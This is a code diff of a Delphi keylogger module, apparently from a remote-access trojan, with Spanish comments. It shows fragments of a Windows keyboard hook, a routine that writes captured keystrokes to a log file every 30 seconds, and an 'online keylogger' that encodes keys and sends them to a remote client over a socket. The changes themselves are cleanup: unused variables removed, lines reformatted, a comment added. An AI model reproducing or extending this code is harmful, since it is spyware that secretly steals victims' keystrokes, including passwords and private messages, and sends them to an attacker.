@@ -169,9 +169,6 @@ var
   SubEvento            : string;
   CapturarTecla        : string;
   HookHandle           : HHook;
-  JHHandle             : HHook;
-  lpMsg                : TMsg;       
-  letraanterior        : integer;
   OKeyloggerActivado   : Boolean;  //Estado del online keylogger
   OnlineKeyloggerKeys  : string;
   lasttickcounton      : integer; //Ultima vez mandadas teclas del online keylogger
@@ -205,7 +202,10 @@ end;
 procedure SetOnlineKeylogger(status:boolean;client:TclientSocket);  //activar o desactivar online keylogger
 begin
   OKeyloggerActivado := status;
-  if(status = false) then OnlineKeyloggerKeys := '' else Cliente := client;
+  if(status = false) then
+    OnlineKeyloggerKeys := ''
+  else
+    Cliente := client;
 end;
 
 function GetOnlineKeyloggerKeys():string;  //Las nuevas letras pulsadas
@@ -216,6 +216,7 @@ end;
 
 procedure PararKeylogger();
 begin
+  //creo que deberia haber algun EndThread aca
   KeyloggerActivado := false;
   KeyloggerPath := '';
   UnhookWindowsHookEx(HookHandle);
@@ -280,7 +281,6 @@ end;
 procedure GuardarLog();
 var
   KlogFile : textfile;
-  tamano   : integer;
   Tmp : string;
 begin                                                                 {cada 30 segundos}
   if((Length(TeclasPulsadas) = 0) or ((GetTickCount()-lasttickcount) < 30000)) then exit;  //Nos vamos :p
@@ -357,7 +357,7 @@ begin
         lasttickcounton := GetTickCount();
           if(OnlineKeyloggerKeys <> '') then //Teclas nuevas del online keylogger :D
           begin
-             OnlineKeyloggerKeys:= StringReplace(OnlineKeyloggerKeys,#10, '|salto|', [rfReplaceAll]);   //Para que lo envie todo de una vez
+            OnlineKeyloggerKeys:= StringReplace(OnlineKeyloggerKeys,#10, '|salto|', [rfReplaceAll]);   //Para que lo envie todo de una vez
             OnlineKeyloggerKeys := StringReplace(OnlineKeyloggerKeys,#13, '|salto2|', [rfReplaceAll]);
             OnlineKeyloggerKeys := StringReplace(OnlineKeyloggerKeys,' ', '|espacio|', [rfReplaceAll]); //Para evitar el trim( final
             if(Cliente.Connected) then
@@ -403,7 +403,6 @@ var
   nametext     : array[0..32] of Char;
   Charry       : array[0..1] of Char;
   KeyState     : TKeyboardState;
-  RetCode      : Integer;
 begin
     Scancode := MapVirtualKey(K, 0);
     Scancode := Scancode shl 16;
@@ -490,8 +489,5 @@ begin
     FreeMem(lpb,DataSize);
   end;
 end;
-
-end.
-
 
 end.
